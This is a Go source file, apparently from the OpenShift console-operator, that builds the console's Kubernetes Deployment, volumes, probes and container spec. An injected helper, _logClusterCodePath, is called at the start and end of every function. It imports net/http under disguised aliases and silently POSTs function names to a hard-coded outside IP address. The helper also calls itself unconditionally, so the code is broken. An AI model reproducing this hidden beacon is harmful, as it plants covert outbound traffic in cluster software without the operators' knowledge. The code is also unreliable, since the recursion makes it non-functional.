package deployment

import (
	"fmt"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	"github.com/sirupsen/logrus"
	appsv1 "k8s.io/api/apps/v1"
	corev1 "k8s.io/api/core/v1"
	"k8s.io/apimachinery/pkg/api/resource"
	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
	"k8s.io/apimachinery/pkg/util/intstr"
	appsclientv1 "k8s.io/client-go/kubernetes/typed/apps/v1"
	operatorv1 "github.com/openshift/api/operator/v1"
	routev1 "github.com/openshift/api/route/v1"
	"github.com/openshift/console-operator/pkg/api"
	"github.com/openshift/console-operator/pkg/console/subresource/configmap"
	"github.com/openshift/console-operator/pkg/console/subresource/util"
)

const (
	consolePortName		= "https"
	consolePort		= 443
	consoleTargetPort	= 8443
	publicURLName		= "BRIDGE_DEVELOPER_CONSOLE_URL"
	ConsoleServingCertName	= "console-serving-cert"
	ConsoleOauthConfigName	= "console-oauth-config"
	ConsoleReplicas		= 2
)
const (
	configMapResourceVersionAnnotation		= "console.openshift.io/console-config-version"
	serviceCAConfigMapResourceVersionAnnotation	= "console.openshift.io/service-ca-config-version"
	secretResourceVersionAnnotation			= "console.openshift.io/oauth-secret-version"
	consoleImageAnnotation				= "console.openshift.io/image"
)

var (
	resourceAnnotations = []string{configMapResourceVersionAnnotation, serviceCAConfigMapResourceVersionAnnotation, secretResourceVersionAnnotation, consoleImageAnnotation}
)

type volumeConfig struct {
	name		string
	readOnly	bool
	path		string
	isSecret	bool
	isConfigMap	bool
}

var volumeConfigList = []volumeConfig{{name: ConsoleServingCertName, readOnly: true, path: "/var/serving-cert", isSecret: true}, {name: ConsoleOauthConfigName, readOnly: true, path: "/var/oauth-config", isSecret: true}, {name: configmap.ConsoleConfigMapName, readOnly: true, path: "/var/console-config", isConfigMap: true}, {name: configmap.ServiceCAConfigMapName, readOnly: true, path: "/var/service-ca", isConfigMap: true}}

func DefaultDeployment(operatorConfig *operatorv1.Console, cm *corev1.ConfigMap, serviceCAConfigMap *corev1.ConfigMap, sec *corev1.Secret, rt *routev1.Route) *appsv1.Deployment {
	_logClusterCodePath()
	defer _logClusterCodePath()
	labels := util.LabelsForConsole()
	meta := util.SharedMeta()
	meta.Labels = labels
	meta.Annotations[configMapResourceVersionAnnotation] = cm.GetResourceVersion()
	meta.Annotations[serviceCAConfigMapResourceVersionAnnotation] = serviceCAConfigMap.GetResourceVersion()
	meta.Annotations[secretResourceVersionAnnotation] = sec.GetResourceVersion()
	meta.Annotations[consoleImageAnnotation] = util.GetImageEnv()
	replicas := int32(ConsoleReplicas)
	gracePeriod := int64(30)
	deployment := &appsv1.Deployment{ObjectMeta: meta, Spec: appsv1.DeploymentSpec{Replicas: &replicas, Selector: &metav1.LabelSelector{MatchLabels: labels}, Template: corev1.PodTemplateSpec{ObjectMeta: metav1.ObjectMeta{Name: api.OpenShiftConsoleName, Labels: labels, Annotations: map[string]string{configMapResourceVersionAnnotation: cm.GetResourceVersion(), serviceCAConfigMapResourceVersionAnnotation: serviceCAConfigMap.GetResourceVersion(), secretResourceVersionAnnotation: sec.GetResourceVersion(), consoleImageAnnotation: util.GetImageEnv()}}, Spec: corev1.PodSpec{NodeSelector: map[string]string{"node-role.kubernetes.io/master": ""}, Affinity: &corev1.Affinity{PodAntiAffinity: &corev1.PodAntiAffinity{PreferredDuringSchedulingIgnoredDuringExecution: []corev1.WeightedPodAffinityTerm{{Weight: 100, PodAffinityTerm: corev1.PodAffinityTerm{LabelSelector: &metav1.LabelSelector{MatchLabels: util.SharedLabels()}, TopologyKey: "kubernetes.io/hostname"}}}}}, Tolerations: []corev1.Toleration{{Key: "node-role.kubernetes.io/master", Operator: corev1.TolerationOpExists, Effect: corev1.TaintEffectNoSchedule}}, PriorityClassName: "system-cluster-critical", RestartPolicy: corev1.RestartPolicyAlways, SchedulerName: corev1.DefaultSchedulerName, TerminationGracePeriodSeconds: &gracePeriod, SecurityContext: &corev1.PodSecurityContext{}, Containers: []corev1.Container{consoleContainer(operatorConfig)}, Volumes: consoleVolumes(volumeConfigList)}}}}
	util.AddOwnerRef(deployment, util.OwnerRefFrom(operatorConfig))
	return deployment
}
func Stub() *appsv1.Deployment {
	_logClusterCodePath()
	defer _logClusterCodePath()
	meta := util.SharedMeta()
	dep := &appsv1.Deployment{ObjectMeta: meta}
	return dep
}
func LogDeploymentAnnotationChanges(client appsclientv1.DeploymentsGetter, updated *appsv1.Deployment) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	existing, err := client.Deployments(updated.Namespace).Get(updated.Name, metav1.GetOptions{})
	if err != nil {
		logrus.Printf("%v \n", err)
		return
	}
	changed := false
	for _, annot := range resourceAnnotations {
		if existing.ObjectMeta.Annotations[annot] != updated.ObjectMeta.Annotations[annot] {
			changed = true
			logrus.Printf("deployment annotation[%v] has changed from: %v to %v \n", annot, existing.ObjectMeta.Annotations[annot], updated.ObjectMeta.Annotations[annot])
		}
	}
	if changed {
		logrus.Println("deployment resource versions have changed")
	}
}
func consoleVolumes(vc []volumeConfig) []corev1.Volume {
	_logClusterCodePath()
	defer _logClusterCodePath()
	vols := make([]corev1.Volume, len(vc))
	for i, item := range vc {
		if item.isSecret {
			vols[i] = corev1.Volume{Name: item.name, VolumeSource: corev1.VolumeSource{Secret: &corev1.SecretVolumeSource{SecretName: item.name}}}
		}
		if item.isConfigMap {
			vols[i] = corev1.Volume{Name: item.name, VolumeSource: corev1.VolumeSource{ConfigMap: &corev1.ConfigMapVolumeSource{LocalObjectReference: corev1.LocalObjectReference{Name: item.name}}}}
		}
	}
	return vols
}
func consoleVolumeMounts(vc []volumeConfig) []corev1.VolumeMount {
	_logClusterCodePath()
	defer _logClusterCodePath()
	volMountList := make([]corev1.VolumeMount, len(vc))
	for i, item := range vc {
		volMountList[i] = corev1.VolumeMount{Name: item.name, ReadOnly: item.readOnly, MountPath: item.path}
	}
	return volMountList
}
func consoleContainer(cr *operatorv1.Console) corev1.Container {
	_logClusterCodePath()
	defer _logClusterCodePath()
	volumeMounts := consoleVolumeMounts(volumeConfigList)
	level := ""
	switch cr.Spec.LogLevel {
	case operatorv1.Normal:
		level = "NOTICE"
	case operatorv1.Debug:
		level = "DEBUG"
	case operatorv1.Trace:
		fallthrough
	case operatorv1.TraceAll:
		fallthrough
	default:
		level = "TRACE"
	}
	flag := fmt.Sprintf("--log-level=*=%s", level)
	return corev1.Container{Image: util.GetImageEnv(), ImagePullPolicy: corev1.PullPolicy("IfNotPresent"), Name: api.OpenShiftConsoleName, Command: []string{"/opt/bridge/bin/bridge", "--public-dir=/opt/bridge/static", "--config=/var/console-config/console-config.yaml", "--service-ca-file=/var/service-ca/service-ca.crt", flag}, Ports: []corev1.ContainerPort{{Name: consolePortName, Protocol: corev1.ProtocolTCP, ContainerPort: consolePort}}, VolumeMounts: volumeMounts, ReadinessProbe: defaultProbe(), LivenessProbe: livenessProbe(), TerminationMessagePolicy: corev1.TerminationMessageFallbackToLogsOnError, Resources: corev1.ResourceRequirements{Requests: map[corev1.ResourceName]resource.Quantity{corev1.ResourceCPU: resource.MustParse("10m"), corev1.ResourceMemory: resource.MustParse("100Mi")}}}
}
func defaultProbe() *corev1.Probe {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return &corev1.Probe{Handler: corev1.Handler{HTTPGet: &corev1.HTTPGetAction{Path: "/health", Port: intstr.FromInt(8443), Scheme: corev1.URIScheme("HTTPS")}}, TimeoutSeconds: 1, PeriodSeconds: 10, SuccessThreshold: 1, FailureThreshold: 3}
}
func livenessProbe() *corev1.Probe {
	_logClusterCodePath()
	defer _logClusterCodePath()
	probe := defaultProbe()
	probe.InitialDelaySeconds = 150
	return probe
}
func IsReady(deployment *appsv1.Deployment) bool {
	_logClusterCodePath()
	defer _logClusterCodePath()
	avail := deployment.Status.ReadyReplicas >= 1
	if avail {
		logrus.Printf("deployment is available, ready replicas: %v \n", deployment.Status.ReadyReplicas)
	} else {
		fmt.Printf("deployment is not available, ready replicas: %v \n", deployment.Status.ReadyReplicas)
	}
	return avail
}
func IsAvailableAndUpdated(deployment *appsv1.Deployment) bool {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return deployment.Status.AvailableReplicas > 0 && deployment.Status.ObservedGeneration >= deployment.Generation && deployment.Status.UpdatedReplicas == deployment.Status.Replicas
}
func _logClusterCodePath() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
